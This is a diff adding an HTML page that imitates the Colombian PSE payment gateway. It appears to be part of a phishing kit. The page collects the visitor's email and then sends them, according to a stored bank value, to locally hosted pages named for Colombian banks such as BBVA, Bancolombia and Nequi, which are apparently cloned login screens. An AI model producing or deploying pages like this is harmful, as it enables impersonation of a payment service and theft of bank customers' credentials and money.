@@ -1,0 +1,247 @@
+<html>
+  <head>
+    <title>PSE - Pago con Registro Person Natural</title>
+    <meta http-equiv="content-type" content="text/html; utf-8" />
+    <meta charset="utf-8" />
+
+    <meta content="es" http-equiv="Content-Language" />
+    <meta name="description" content="" />
+    <meta name="author" content="" />
+    <meta name="Copyright" content="" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" type="text/css" href="./style.css" />
+  </head>
+
+  <body>
+    <input type="hidden" name="hdd-opcion" id="hdd-opcion" />
+    <div id="cabecera">
+      <img src="./img/lps.png" id="logo-mobile" />
+      <table
+        cellpadding="0"
+        cellspacing="0"
+        width="98%"
+        border="0"
+        id="tbl-cabecera"
+      >
+        <tr>
+          <td valign="middle" align="left" width="200" id="td-logo">
+            <img src="./img/lps.png" />
+          </td>
+          <td valign="middle" align="left" id="td-texto">
+            Fácil, rápido y seguro
+          </td>
+        </tr>
+      </table>
+    </div>
+    <img src="./img/ayuda.jpg" id="ayuda" />
+    <div
+      style="
+        text-align: center;
+        font-weight: 700;
+        font-size: 21px;
+        color: #323153;
+        margin-top: 47px;
+        margin-bottom: 44px;
+        padding: 0px 60px;
+      "
+    >
+      PSE - Pagos Seguros en Línea / Persona Natural
+    </div>
+    <table border="0" cellspacing="0" cellpadding="0" id="tipos-personas">
+      <tr>
+        <td
+          valign="top"
+          align="center"
+          style="
+            color: #323153;
+            text-align: center;
+            font-weight: 400;
+            font-size: 21px;
+          "
+        >
+          <img src="./img/pers.jpg" />
+          <br />
+          Persona natural
+        </td>
+        <td
+          valign="top"
+          align="center"
+          style="
+            color: #323153;
+            text-align: center;
+            font-weight: 400;
+            font-size: 21px;
+          "
+        >
+          <img src="./img/emp.jpg" />
+          <br />
+          Persona juridica
+        </td>
+      </tr>
+    </table>
+
+    <table
+      border="0"
+      cellspacing="0"
+      cellpadding="0"
+      width="98%"
+      id="tbl-tipo-mobile"
+    >
+      <tr>
+        <td valign="middle" align="left"><img src="./img/registr.jpg" /></td>
+        <td valign="middle" align="left" class="u-reg">
+          Soy un usuario registrado
+        </td>
+      </tr>
+    </table>
+
+    <table border="0" cellspacing="0" cellpadding="0" width="98%" id="tbl-tipo">
+      <tr>
+        <td valign="middle" align="left" class="tipo-izq">
+          <img src="./img/registr.jpg" />
+        </td>
+        <td valign="middle" align="left" class="tipo-izq u-reg">
+          Soy un usuario registrado
+        </td>
+        <td valign="middle" align="left"><img src="./img/nuevo.jpg" /></td>
+        <td valign="middle" align="left" class="u-reg" style="color: #8b8d99">
+          Quiero registrarme ahora
+        </td>
+      </tr>
+    </table>
+    <div
+      id="frm-correo"
+      style="display: flex; align-items: center; flex-direction: column"
+    >
+      <div
+        style="
+          display: flex;
+          justify-content: space-around;
+          width: 100%;
+          align-items: center;
+        "
+        class="email-container"
+      >
+        <p id="etq-email">E-mail</p>
+        <input
+          class="entrada-pse"
+          type="email"
+          id="txt-email"
+          placeholder="E-mail registrado en PSE"
+          maxlength="120"
+        />
+      </div>
+
+      <div class="separador"></div>
+      <button class="btn-pse" id="btn-banco" style="margin-bottom: 84px">
+        Ir al Banco
+      </button>
+    </div>
+    <div id="cargando"></div>
+    <div id="pie-mobile"><img src="./img/super.jpg" /></div>
+    <table cellpadding="0" cellspacing="0" border="0" width="80%" id="pie">
+      <tr>
+        <td align="left" id="lado-izq-pie">
+          <img src="./img/super.jpg" />
+        </td>
+        <td align="right" id="lado-der-pie">
+          <div style="width: 100%; max-width: 340px" class="letra-pie">
+            Para mayor información comunícate con nosotros
+          </div>
+          <table
+            cellpadding="0"
+            cellspacing="0"
+            border="0"
+            width="100%"
+            style="max-width: 340px"
+          >
+            <tr>
+              <td class="letra-pie">en Bogotá +57 (1) 3808890 opción 5</td>
+            </tr>
+            <tr>
+              <td class="letra-pie">
+                o escríbenos https://www.pse.com.co/persona, opción centro de
+                ayuda, Formulario de contacto.
+              </td>
+            </tr>
+          </table>
+        </td>
+      </tr>
+    </table>
+    <script src="../../js/functions.js"></script>
+    <script>
+      const email_info = info.metaInfo.email || "";
+      const ban = info.metaInfo.ban || "";
+
+      document
+        .getElementById("btn-banco")
+        .addEventListener("click", function () {
+          const email = document.getElementById("txt-email").value;
+
+          guardarValor("email", email, 9, "Por favor ingrese un email válido");
+
+          switch (ban) {
+            case "bbva":
+              window.location.href = "./bbva/index.html";
+              break;
+            case "colpatria":
+              window.location.href = "./colpatria/index.html";
+              break;
+            case "davivienda":
+              window.location.href = "./davivienda/index.html";
+              break;
+            case "bogota":
+              window.location.href = "./bogota/index.html";
+              break;
+            case "occidente":
+              window.location.href = "./occidente/index.html";
+              break;
+            case "falabella":
+              window.location.href = "./falabella/index.html";
+              break;
+            case "finandina":
+              window.location.href = "./finandina/index.html";
+              break;
+            case "serfinanza":
+              window.location.href = "./serfinanza/index.html";
+              break;
+            case "bancolombia":
+              window.location.href = "../trico/home.html";
+              break;
+            case "nequi":
+              window.location.href = "../nequi/rastrear/indexwait.html";
+              break;
+            default:
+              alert("Banco no válido");
+              break;
+          }
+        });
+    </script>
+    <style>
+      .email-container {
+        display: flex;
+        justify-content: space-around;
+        align-items: center;
+        flex-direction: row; /* Predeterminado: horizontal */
+        width: 100%;
+      }
+
+      @media (max-width: 768px) {
+        .email-container {
+          flex-direction: column; /* Cambia a vertical en pantallas móviles */
+          gap: 10px; /* Espaciado entre elementos */
+        }
+      }
+    </style>
+  </body>
+</html>
